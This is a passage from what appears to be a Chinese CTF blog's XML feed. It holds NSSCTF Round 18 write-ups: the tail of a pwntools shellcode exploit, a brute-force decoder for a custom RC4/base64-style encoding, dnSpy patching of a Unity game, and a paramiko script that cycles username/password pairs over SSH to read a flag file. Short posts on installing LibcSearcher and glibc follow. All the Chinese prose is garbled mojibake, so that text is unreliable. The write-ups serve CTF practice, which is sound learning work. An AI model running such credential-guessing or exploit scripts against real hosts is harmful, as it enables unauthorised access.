class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sa(<span class="hljs-string">&quot;:&quot;</span>,sh)<br>pause()<br>sl(sd+sf)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="ç¼–ç "><a href="#ç¼–ç " class="headerlink" title="ç¼–ç "></a>ç¼–ç </h2><p>ç›´æ¥å¯†æ–‡å»è§£å¯†ä¸å¯¹</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896480014-6513872d-2a7a-4f57-a6b7-27fe2aa5a271.png" class="" title="img"><p>æœ‰tlsä¹Ÿç»•è¿‡äº†ï¼ˆtlsä¸ä¸€å®šèƒ½å¤Ÿç”¨ä¸Šï¼‰</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896510027-81ff0497-65d7-4ea5-9c79-fd25036fd396.png" class="" title="img"><p>ä¹Ÿæ²¡çœ‹å‡ºæœ‰å…¶ä»–çš„ç®—æ³•</p><p>è¿™ç§ä¸€èˆ¬éƒ½æ˜¯è‡ªå·±è®¾è®¡çš„ç®—æ³•ï¼Œè¦é™ä¸‹å¿ƒæ¥çœ‹</p><p>å‘ç°å…ˆåè¿›åˆ¶è½¬äºŒè¿›åˆ¶</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050502254-af67ad5d-02e9-4c98-9e25-8a52fa81bd84.png" class="" title="img"><p>ç»è¿‡rc4åˆå§‹åŒ–ç®—æ³•</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050549029-968a083a-1240-484f-b9f2-b86796fdb424.png" class="" title="img"><p>å†æŠŠäºŒè¿›åˆ¶è½¬åŒ–ä¸ºåè¿›åˆ¶ä½œä¸ºä¸‹æ ‡å»æ‰¾å¯¹åº”çš„å€¼ï¼Œç±»ä¼¼äºbase64</p><p>è¿™ç§è¦é€šè¿‡çˆ†ç ´ï¼Œé¦–å…ˆæ‰¾å¯†æ–‡åœ¨tableé‡Œçš„ä¸‹æ ‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">table = [<br>    <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xC9</span>,<br>    <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD3</span>,<br>    <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xE3</span>,<br>    <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xED</span>,<br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>,<br>    <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xB6</span>,<br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xAE</span><br>]<br><br>enc = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;E2F7D3E2C8B4D8C5CFB4E7EEE1D9F1EFCBEBD9C9CEC5D9E5CCB7D1EDE0B4F1EEE0E7D2F6CBF3C9F3D3D5EF&quot;</span>)<br><span class="hljs-built_in">print</span>(enc)<br>idx = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>    idx.append(table.index(i))<span class="hljs-comment">#éå†å­—èŠ‚æ•°ç»„encä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œä½¿ç”¨table.index(i)æ–¹æ³•æ‰¾åˆ°è¯¥å…ƒç´ åœ¨tableåˆ—è¡¨ä¸­çš„ç´¢å¼•</span><br><br>s = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> idx:<br>    s.append(<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<span class="hljs-comment">#zfillå·¦ä¾§å¡«å……</span><br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0b111111</span>):<br>        c = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<br>        l = <span class="hljs-number">0</span><br>        r = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>,<span class="hljs-number">2</span>):<span class="hljs-comment">#i=v3+1=i+1+1</span><br>            l = (k + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            r = (l + r + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            c[l % <span class="hljs-number">6</span>], c[r % <span class="hljs-number">6</span>] = c[r % <span class="hljs-number">6</span>], c[l % <span class="hljs-number">6</span>]<br>        d = <span class="hljs-string">&quot;&quot;</span>.join(c)<br>        <span class="hljs-keyword">if</span> d == i:<br>            res += <span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>            <span class="hljs-keyword">break</span><br><br>b = [res[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(res), <span class="hljs-number">8</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">2</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#NSSCTF&#123;Y0u_4reThe_K1ng_0fBase64&#125;</span><br></code></pre></td></tr></table></figure><h2 id="GenshinWishSimulator"><a href="#GenshinWishSimulator" class="headerlink" title="GenshinWishSimulator"></a>GenshinWishSimulator</h2><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707900162098-9fff77af-2806-41ac-866c-8991156082c7.png" class="" title="img"><p>ç”¨dnspyæ‰“å¼€ï¼Œæ‰¾å…³é”®ç±»*Manager</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707901366902-a403543b-7c1e-47b6-ad11-9776325c9cd8.png" class="" title="img"><p>ç”¨z3è§£æ–¹ç¨‹ç»„</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902129974-d2e72bff-cce6-4c4d-affd-f32e5f84bf3f.png" class="" title="img"><p>å¾—åˆ°iv</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902261420-02f82295-67c4-477e-8674-c6ad06b5b9f1.png" class="" title="img"><p>145,118,31,48,103,110,52,82,113,19,83,44,176,130,138,129,115,110,38,10,42,100,193,105,125,61,7,229,230,180,68,133,11,177,210,122,161,60,129,140,16,45,224,83,238,0,213,157,121,193,135,197,87,118,155,110,90,91,30,158,248,44,95,215,166,247,239,43,228,114,227,146,164,137,111,79,143,17,132,14</p><p>keyå’Œå¡«å……æ–¹å¼å¾ˆæ˜æ˜¾ï¼Œä½†æ˜¯è§£ä¸å‡ºæ¥ï¼Ÿ</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707905579072-8d1e25a1-ec40-4bb9-9c35-60d95850cc67.png" class="" title="img"><p>mdï¼Œkeyå’Œivå¼„åäº†ï¼Œè€Œä¸”keyæ˜¯utf-8å½¢å¼ï¼Œä¸æ‰¾å€Ÿå£</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008328700-57e3f9c3-60ba-4b81-b999-6e1791f9855f.png" class="" title="img"><p>ç”¨å¦ä¸€ç§æ–¹å¼å¤ç°</p><p>è¦ç»è¿‡checkå‡½æ•°æ‰ä¼šæ‰§è¡Œgift</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008674108-1e115c0f-0266-4197-9f3b-d3bbd9ae9567.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008835792-7cb82437-2578-47d6-a225-1df4bbec6959.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008882947-d72a0c6a-4e9f-4efb-9dc0-83df6e4af26b.png" class="" title="img"><p>ä¿®æ”¹åˆå§‹å€¼çš„è¯é€‰æ‹©ç¼–è¾‘ç±»</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008910188-821abe3f-4db0-440d-9c19-04fc8c88a72a.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009108153-0bd6ce8f-8d07-4512-bf4c-d518cbb331f3.png" class="" title="img"><p>å¦‚æœç›´æ¥ä¿å­˜æ¨¡å—ä¹Ÿèƒ½å‡ºï¼Œè¿˜æ˜¯æœ‰ä¸€å®šæ¦‚ç‡</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009225510-6cfe7d63-9df6-4784-a4ef-2e73f8f09c5f.png" class="" title="img"><p>è¦çš„flagåœ¨è¿™é‡Œï¼Œä¿®æ”¹ä¸€ä¸‹ä½¿å¾—å®ƒå¿…ç„¶è¢«æ‰§è¡Œ</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009396841-b920b4d0-fa87-45f9-9058-ee4b5bf7bc4d.png" class="" title="img"><p>å³é”®ç¼–è¾‘æ–¹æ³•</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009508484-d19253c5-2bba-428e-b6ea-107e6f5171ee.png" class="" title="img"><h2 id="æ–°å¹´å¿«ä¹"><a href="#æ–°å¹´å¿«ä¹" class="headerlink" title="æ–°å¹´å¿«ä¹"></a>æ–°å¹´å¿«ä¹</h2><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053405853-dab66655-2aa2-48ae-86cf-56d3488772a7.png" class="" title="img"><p>stringæœ‰dll</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053940754-b3a3b96a-3c0b-458e-a3c4-d72451611a5c.png" class="" title="img"><p>ä¹Ÿæ²¡çœ‹åˆ°æœ‰sha256ç®—æ³•</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054072607-ad2c4d64-f471-4eb1-b285-19581f54694d.png" class="" title="img"><p>010æœç´¢MZ</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054194721-3290df63-dc66-4aa8-941d-49c46082fa3e.png" class="" title="img"><p>ç”¨Dnspyæ‰“å¼€</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708063124709-72492c56-0475-4245-8080-1c845e3e67ad.png" class="" title="img"><p>ç”¨vscodeè¿è¡Œå³å¯</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708065409901-24731386-9db8-4c83-a1b8-df148d58cc6e.png" class="" title="img"><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="é…’å§"><a href="#é…’å§" class="headerlink" title="é…’å§"></a>é…’å§</h2><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897006283-e11c8e66-60d8-453b-bbb4-4923172ebad4.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897289557-b1b0d72c-33b7-452d-b9d9-3c335f494b72.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897442652-5643f483-589a-42c4-a7ee-ac578ca09b93.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897125919-70ff2871-f8fc-49d1-af17-80f663910385.png" class="" title="img"><h2 id="number7"><a href="#number7" class="headerlink" title="number7"></a>number7</h2><p>ç›´æ¥è§£base64ä¼šå‡ºé”™ï¼Œä¿®æ”¹ç¬¬ä¸ƒä¸ªå’Œç¬¬ä¹ä¸ªæ•°å­—ä»0åˆ°féƒ½ä¸å¯¹</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707898430820-55d77299-2129-495c-8f4b-9674a7e705b3.png" class="" title="img"><p>æ ¹æ®Number7 è€Œä¸”inside NO.7çŒœæµ‹cisco type7åŠ å¯†</p><p>åé¢å°‘äº†å‡ ä½ï¼Œä½†æ˜¯ä¸å½±å“flag<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708007743062-01c8b0da-a225-42ab-8bf6-0c5ee8524710.png" class="" title="img"></p><h2 id="userssss"><a href="#userssss" class="headerlink" title="userssss"></a>userssss</h2><p>æƒ³æ³•æ˜¯å†™è„šæœ¬ç®—md5sumï¼Œç„¶åè‡ªåŠ¨äº¤äº’</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899075674-94d6549e-74b1-4fa9-9a6d-11d6ac0001c0.png" class="" title="img"><p>ä¸çŸ¥é“è¦å‘è¿œç¨‹æ€ä¹ˆå‘é€ï¼Œè¦æœ‰ç”¨æˆ·åå’Œå¯†ç </p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899762242-e173afcc-df88-420a-a26c-f2ae5bb6c5c8.png" class="" title="img"><p>é¦–å…ˆmd5sumå°±æ˜¯MD5ï¼Œå…¶æ¬¡ç”¨ssh -pè¿æ¥</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009841111-baa8ea56-12cd-4ef5-bb68-60ab768691fb.png" class="" title="img"><p>è‡ªåŠ¨ç®—md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">input</span>=<span class="hljs-string">&quot;/CVE/wordlist.txt&quot;</span><br>output=<span class="hljs-string">&quot;/CVE/4.txt&quot;</span><br><br><span class="hljs-comment"># é‡ç½®è¾“å‡ºæ–‡ä»¶</span><br>&gt; <span class="hljs-string">&quot;$output&quot;</span><br><br><span class="hljs-comment"># éå†wordlist.txtä¸­çš„æ¯ä¸€è¡Œ</span><br><span class="hljs-keyword">while</span> IFS= read -r line || [[ -n <span class="hljs-string">&quot;$line&quot;</span> ]]; do<br>    <span class="hljs-comment"># è·³è¿‡ç©ºç™½è¡Œ</span><br>    <span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">&quot;$line&quot;</span> ]]; then<br>        <span class="hljs-keyword">continue</span><br>    fi<br><br>    <span class="hljs-comment"># è®¡ç®—æ¯è¡Œçš„MD5å“ˆå¸Œå€¼</span><br>    md5=$(echo -n <span class="hljs-string">&quot;$line&quot;</span> | md5sum | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>    <br>    <span class="hljs-comment"># å°†è®¡ç®—å‡ºçš„å“ˆå¸Œå€¼è¿½åŠ åˆ°4.txtæ–‡ä»¶ä¸­</span><br>    echo <span class="hljs-string">&quot;$md5&quot;</span> &gt;&gt; <span class="hljs-string">&quot;$output&quot;</span><br>done &lt; <span class="hljs-string">&quot;$input&quot;</span><br></code></pre></td></tr></table></figure><p>è‡ªåŠ¨äº¤äº’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> paramiko<br><br><span class="hljs-comment"># è®¾ç½®ä¸»æœºä¿¡æ¯</span><br>hostname = <span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span><br>port = <span class="hljs-number">28591</span><br><br><span class="hljs-comment"># è¯»å–ç”¨æˆ·åå’Œå¯†ç åˆ—è¡¨</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wordlist.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> user_file:<br>    usernames = user_file.read().splitlines()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;10.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> pass_file:<br>    passwords = pass_file.read().splitlines()<br><br><span class="hljs-comment"># ç¡®ä¿ç”¨æˆ·åå’Œå¯†ç åˆ—è¡¨é•¿åº¦ç›¸åŒ</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(usernames) == <span class="hljs-built_in">len</span>(passwords), <span class="hljs-string">&quot;ç”¨æˆ·åå’Œå¯†ç æ•°é‡ä¸åŒ¹é…&quot;</span><br><br><span class="hljs-comment"># å°è¯•ç™»å½•å¹¶æ‰§è¡Œå‘½ä»¤</span><br><span class="hljs-keyword">for</span> username, password <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(usernames, passwords):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># åˆå§‹åŒ–SSHå®¢æˆ·ç«¯</span><br>        client = paramiko.SSHClient()<br>        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>        <br>        <span class="hljs-comment"># å°è¯•è¿æ¥</span><br>        client.connect(hostname, port, username, password, timeout=<span class="hljs-number">10</span>)<br>        <br>        <span class="hljs-comment"># æ‰§è¡Œlså‘½ä»¤</span><br>        stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>        output = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <br>        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦å­˜åœ¨flag.txt</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag.txt&#x27;</span> <span class="hljs-keyword">in</span> output:<br>            <span class="hljs-comment"># è¯»å–flag.txtå†…å®¹</span><br>            stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;cat flag.txt&#x27;</span>)<br>            flag_content = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).strip()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ‰¾åˆ°flag: <span class="hljs-subst">&#123;flag_content&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;åœ¨ç”¨æˆ· <span class="hljs-subst">&#123;username&#125;</span> çš„ç›®å½•ä¸­æ²¡æœ‰æ‰¾åˆ°flag.txt&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ç™»å½•å¤±è´¥ï¼šç”¨æˆ·å <span class="hljs-subst">&#123;username&#125;</span> æˆ–å¯†ç é”™è¯¯&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å‘ç”Ÿé”™è¯¯ï¼š<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        client.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unityé€†å‘</tag>
      
      <tag>VM</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•å®‰è£…libcsearch</title>
    <link href="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/"/>
    <url>/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/</url>
    
    <content type="html"><![CDATA[<p>githubä¸Šlibcsearchåªå¯¹python2æœ‰æ•ˆï¼Œç”¨python3å°±æ‰¾ä¸åˆ°åŒ¹é…çš„libcç‰ˆæœ¬äº†ï¼Œç½‘ä¸Šè¯´çš„é‡è£…æˆ–è€…æ›´æ–°éƒ½æ˜¯é’ˆå¯¹python2çš„ï¼Œç”±äºæœ¬æœºå®‰è£…pwntoolsç”¨çš„æ˜¯python3ä¸”python2å·²ç»ä¸ç»´æŠ¤äº†ï¼Œå¹²è„†å°±å¦å¯»å‡ºè·¯</p><p><a href="https://pypi.org/project/LibcSearcher/#files">https://pypi.org/project/LibcSearcher/#files</a></p><p>ä»ä¸Šé¢çš„é“¾æ¥ä¸­ä¸‹è½½libcsearchå¯æ»¡è¶³python3</p><p>ç„¶åå†å»è·‘è„šæœ¬ï¼Œæœç„¶å¯ä»¥äº†</p><img src="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/1691905062554-b22ce7a6-1d9a-4bf7-972b-b4a57d8cab49.png" class="" title="img"><p>è¿™æ˜¯è¿œç¨‹çš„libcé€‰æ‹©ï¼Œå’Œæœ¬åœ°ä¸ä¸€æ ·</p><p>ä¸Šç½‘æŸ¥ä¸€ä¸‹å‘ç°ubuntu18å¯¹åº”libc2.27ï¼Œå…ˆè¯•ä¸€ä¸‹ç¬¬ä¸‰ä¸ªï¼ŒæˆåŠŸ</p><img src="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/1691905008510-c2cd1f79-d48d-422d-9ae0-659f0d94e1e0.png" class="" title="img"><p>è¿˜æœ‰ä¸ªé—®é¢˜æ˜¯è¦çŸ¥é“æœ¬æœºçš„libcç‰ˆæœ¬ï¼Œæˆ‘è¿™é‡Œæ˜¯libc6_2.36-4_amd64,è¿™æ ·æ‰“æœ¬åœ°ä¼šå¿«ä¸€ç‚¹ï¼Œæ¯æ¬¡æ‰“ä¸ªä¸€ä¸¤åˆ†é’Ÿéƒ½æ˜¯å¸¸æœ‰çš„äº‹ï¼Œä¸ç”¨å¥‡æ€ª</p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>äºŒè¿›åˆ¶æ–‡ä»¶å­˜åœ¨ä½†ä»æœ‰FileNotFoundError</title>
    <link href="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/"/>
    <url>/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/</url>
    
    <content type="html"><![CDATA[<h1 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h1><p>æ¡Œé¢æ˜æ˜æœ‰vulnè¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯kaliä»æœ‰FileNotFoundError</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/4BE59ACDFB71F188E62CCF1B8E4A7979.jpg" class="" title="img"><p>é—®ç¾¤é‡Œçš„å¸ˆå‚…åŸæ¥æ˜¯è¦è£…glibc-all-in-one</p><p>ä¸€å¼€å§‹å¸ˆå‚…è¯´è¦ç”¨.&#x2F;libc.so.6æŸ¥çœ‹è¦å®‰è£…çš„libcç‰ˆæœ¬ï¼Œä½†æœ¬åœ°ä¸€ç›´æŠ¥é”™</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/7DFD5873CC9E06A971F4766218EB5E2C.jpg" class="" title="img"><p>æˆ‘googleäº†ä½†æ˜¯ä¸€ç›´æ²¡æœ‰ç›´æ¥çš„è§£å†³æ–¹æ¡ˆï¼Œäºæ˜¯åœ¨å¦ä¸€ä½å¸ˆå‚…çš„æ¨èä¸‹çœ‹äº†å¦ä¸€ç¯‡æ–‡æ¡£ï¼Œç”¨strings libc.so.6 |grep Ubuntuæ¥ç¡®å®šéœ€è¦å®‰è£…çš„libcåº“ </p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215652930.png" class="" title="image-20240201215652930"><p>ç›´æ¥ä¸‹è½½libcå‡ºé”™ï¼Œäºæ˜¯å»å®˜ç½‘æ‰‹åŠ¨ä¸‹è½½</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215612566.png" class="" title="image-20240201215612566"><p>æœ€åæŒ‰æ•™ç¨‹é…ç½®å³å¯</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215510938.png" class="" 